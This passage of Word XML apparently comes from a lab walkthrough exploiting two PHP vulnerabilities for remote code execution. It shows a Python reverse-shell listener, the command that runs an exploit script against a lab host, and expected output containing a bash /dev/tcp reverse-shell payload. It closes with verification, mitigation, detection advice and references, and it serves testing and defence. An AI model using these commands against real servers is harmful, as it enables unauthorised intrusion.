          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>#   method=GET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># (Optional) watch for the reverse shell during the exploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>sudo watch -n0.2 'ps -ef | grep -E "bash|/dev/tcp" | grep -v grep'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 On the Windows attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Terminal 1 — start the listener</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python -c "import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,"\</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>"socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',4444)); s.listen(1); print('listening');\</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>" c,a=s.accept(); print('conn',a); c.recv(4096)"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Terminal 2 — run the exploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>python php2shell_exploit.py --target 192.168.56.10 --port 80 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    --attacker 192.168.56.20 --rport 4444 --mode both</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 Expected output</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[*] cmd: 'bash -i &gt;&amp; /dev/tcp/192.168.56.20/4444 0&gt;&amp;1; echo PHP2SHELL_PWNED_4444'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[+] sprayed 1048576 bytes / 5 parts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[+] OOM status=500</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[+] fatal status=500</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[+] land status=200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>[+] REVERSE SHELL from ('192.168.56.10', 53211)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>PHP2SHELL_PWNED_4444</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Verification</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Check</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Where</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>What you see</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Reverse shell connects</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Windows listener</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>REVERSE SHELL from (target_ip, ephemeral)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Marker string</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Windows listener</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PHP2SHELL_PWNED_4444</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Process parentage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Linux ps</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>bash -i as a child of the apache/php worker, running as www-data</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>OOM path (109618)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Linux dmesg / PHP log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PHP OOM / longjmp abort; Apache 500 on the large POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>UAF path (109619)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PHP error log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Fatal error / parse error on malformed POST, then landing 200</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>9. Mitigation &amp; Hardening</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Patch PHP to the fixed release (per the PHP Group security advisory). This is the only complete fix.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lower memory_limit and cap post_max_size / upload_max_filesize to reduce OOM reachability.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WAF / virtual patching: block oversized multipart bodies and malformed multipart boundaries (the NGFW signature php|multipart|upload.progress|longjmp does this).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Detection: alert on any bash/sh child of a PHP worker running as the web user (www-data / apache / wwwrun), plus OOM / fatal-error bursts in PHP/Apache logs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Assess exposure via asset inventory (Cortex Xpanse, Shodan, Censys) for unpatched PHP 8.3.x / 8.4.x instances.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>10. References</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Palo Alto Networks / Unit 42 — "Threat Brief: Critical Vulnerabilities in PHP: CVE-2026-109618, CVE-2026-109619" (Oct 23, 2026; updated Oct 25, 2026)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHP Group — "Security advisory: Critical remote code execution vulnerabilities, update now"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CVE-2026-109618 — NVD entry</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CVE-2026-109619 — NVD entry</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS 4.0 specification —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